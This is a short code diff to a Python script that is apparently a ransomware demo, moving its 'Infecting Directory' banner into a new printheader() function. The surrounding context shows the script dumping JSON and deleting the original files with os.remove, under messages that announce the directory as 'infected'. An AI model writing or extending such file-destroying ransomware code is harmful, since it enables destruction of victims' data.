@@ -22,11 +22,7 @@ def main():
 
 	animation = Thread(target=cinematics)
 
-	os.chdir('..')
-	sys.stdout.write('\nInfecting Directory: ' + colorama.Fore.GREEN + \
-		os.getcwd() + colorama.Style.RESET_ALL + '...  ')
-	sys.stdout.flush()
-	os.chdir('ransomware')
+	printheader()
 
 	animation.start()
 
@@ -80,6 +76,7 @@ def main():
 				json.dump(json_dict, json_file)
 
 			os.remove(os.path.join(current_directory, file))
+
 	repeat = False
 
 def cinematics():
@@ -97,6 +94,13 @@ def cinematics():
 	os.chdir('..')
 	sys.stdout.write('\b \n\n' + colorama.Style.RESET_ALL + 'Directory has been ' + colorama.Fore.RED + 'infected' + colorama.Style.RESET_ALL + '\n\n')
 	sys.stdout.write(colorama.Style.RESET_ALL)
+
+def printheader():
+	os.chdir('..')
+	sys.stdout.write('\nInfecting Directory: ' + colorama.Fore.GREEN + os.getcwd() + '...  ')
+	sys.stdout.flush()
+	sys.stdout.write(colorama.Style.RESET_ALL)
+	os.chdir('ransomware')
 
 if __name__ == '__main__':
 	main()
